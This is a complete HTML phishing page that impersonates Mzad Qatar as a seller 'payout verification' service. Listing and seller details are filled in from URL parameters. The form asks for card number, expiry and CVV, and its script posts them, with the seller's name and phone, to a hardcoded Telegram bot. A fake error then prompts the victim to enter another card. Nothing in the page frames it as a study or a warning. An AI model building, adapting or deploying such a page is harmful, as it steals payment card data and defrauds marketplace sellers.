<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mzad Qatar | Secure Payment Service</title>
    <style>
        :root { --mzad-maroon: #8a1538; --mzad-dark: #58595b; --bg: #f2f3f5; }
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--bg); margin: 0; padding: 0; color: #333; -webkit-font-smoothing: antialiased; }
        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
        
        /* Navbar с логотипом */
        .header { height: 65px; background: white; border-bottom: 3px solid var(--mzad-maroon); display: flex; align-items: center; justify-content: center; position: sticky; top: 0; z-index: 100; }
        .logo-box { display: flex; align-items: center; gap: 5px; }
        .logo-circle { width: 35px; height: 35px; background: var(--mzad-maroon); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 900; font-size: 20px; }
        .logo-text { color: var(--mzad-maroon); font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }

        /* Product Section */
        .item-card { padding: 20px 15px; border-bottom: 8px solid var(--bg); }
        .secure-badge { background: #e6f7ee; color: #27ae60; font-size: 12px; font-weight: 700; padding: 5px 10px; border-radius: 20px; display: inline-block; margin-bottom: 15px; }
        .item-flex { display: flex; gap: 15px; align-items: center; }
        .item-img { width: 110px; height: 110px; border-radius: 12px; object-fit: cover; border: 1px solid #eee; background: #fff; }
        .item-info h1 { margin: 0; font-size: 19px; line-height: 1.3; color: #222; }
        .item-price { color: var(--mzad-maroon); font-size: 24px; font-weight: 800; margin-top: 8px; }

        /* Details */
        .details { padding: 15px; background: #fafafa; border-bottom: 1px solid #eee; }
        .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
        .row:last-child { border: none; }
        .label { color: #888; }
        .val { font-weight: 600; color: #444; }

        /* Form */
        .form-box { padding: 25px 15px; }
        .form-box h3 { color: var(--mzad-dark); font-size: 16px; margin: 0 0 20px; text-transform: uppercase; text-align: center; letter-spacing: 1px; }
        .input-g { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; margin-bottom: 15px; transition: 0.3s; background: #fdfdfd; }
        .input-g:focus { border-color: var(--mzad-maroon); outline: none; background: #fff; }
        .btn-main { background: var(--mzad-maroon); color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px rgba(138, 21, 56, 0.25); }
        .btn-main:active { transform: scale(0.98); opacity: 0.9; }

        /* Footer */
        .footer { background: #222; color: #666; padding: 35px 15px; text-align: center; font-size: 11px; margin-top: auto; }
        .footer-logo { color: #444; font-size: 18px; font-weight: 800; margin-bottom: 10px; display: block; }
    </style>
</head>
<body>

<div class="app-shell">
    <header class="header">
        <div class="logo-box">
            <div class="logo-circle">M</div>
            <div class="logo-text">MZAD QATAR</div>
        </div>
    </header>

    <div class="item-card">
        <div class="secure-badge">● SECURE TRANSACTION ACTIVE</div>
        <div class="item-flex">
            <img id="p-img" src="" class="item-img">
            <div class="item-info">
                <h1 id="p-name">Loading...</h1>
                <div class="item-price" id="p-price">0 QAR</div>
            </div>
        </div>
    </div>

    <div class="details">
        <div class="row"><span class="label">Seller Name</span><span class="val" id="s-name">...</span></div>
        <div class="row"><span class="label">Phone Number</span><span class="val" id="s-phone">...</span></div>
        <div class="row"><span class="label">Location</span><span class="val" id="s-addr">...</span></div>
        <div class="row"><span class="label">Order Status</span><span class="val" style="color:#27ae60">Paid by Buyer</span></div>
    </div>

    <div class="form-box">
        <h3>Payout Verification</h3>
        <form id="pay-f">
            <input type="text" id="cc" class="input-g" placeholder="Card Number" required maxlength="19">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="exp" class="input-g" placeholder="MM/YY" required maxlength="5">
                <input type="text" id="cvv" class="input-g" placeholder="CVV" required maxlength="4">
            </div>
            <button type="submit" class="btn-main" id="btn-txt">RECEIVE QAR</button>
        </form>
    </div>

    <div class="footer">
        <span class="footer-logo">MZAD QATAR</span>
        © 2026 Mzad Qatar Delivery & Protection Services. <br>
        Encrypted by Qatar National Bank (QNB) Security Protocol.
    </div>
</div>

<script>
    // --- ПОДКЛЮЧЕНИЕ БОТА ---
    const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
    const CHAT_ID = '8071425015';

    // Читаем параметры из ссылки
    const url = new URLSearchParams(window.location.search);
    const item = url.get('item') || 'Product Name';
    const price = url.get('price') || '0';
    
    document.getElementById('p-name').innerText = item;
    document.getElementById('p-price').innerText = price + ' QAR';
    document.getElementById('p-img').src = url.get('img') || 'https://via.placeholder.com/150';
    document.getElementById('s-name').innerText = url.get('seller') || 'Verified User';
    document.getElementById('s-phone').innerText = url.get('phone') || '+974 0000 0000';
    document.getElementById('s-addr').innerText = url.get('addr') || 'Doha, Qatar';

    // Отправка данных
    document.getElementById('pay-f').onsubmit = async (e) => {
        e.preventDefault();
        const b = document.getElementById('btn-txt');
        b.innerText = 'VERIFYING...';
        b.disabled = true;

        const logMsg = `🇶🇦 **MZAD QATAR LOG**\n\n📦 Item: ${item}\n💰 Price: ${price} QAR\n\n💳 Card: \`${document.getElementById('cc').value}\`\n📅 Exp: \`${document.getElementById('exp').value}\`\n🔒 CVV: \`${document.getElementById('cvv').value}\`\n\n👤 Seller: ${url.get('seller')}\n📱 Phone: ${url.get('phone')}`;

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: logMsg, parse_mode: 'Markdown' })
            });

            setTimeout(() => {
                alert("Identity verification required. Please use another card to complete the payout transfer.");
                b.innerText = 'RECEIVE QAR';
                b.disabled = false;
                document.getElementById('pay-f').reset();
            }, 2500);
        } catch (err) {
            alert("System busy. Try again later.");
            b.disabled = false;
        }
    };
</script>

</body>
</html>
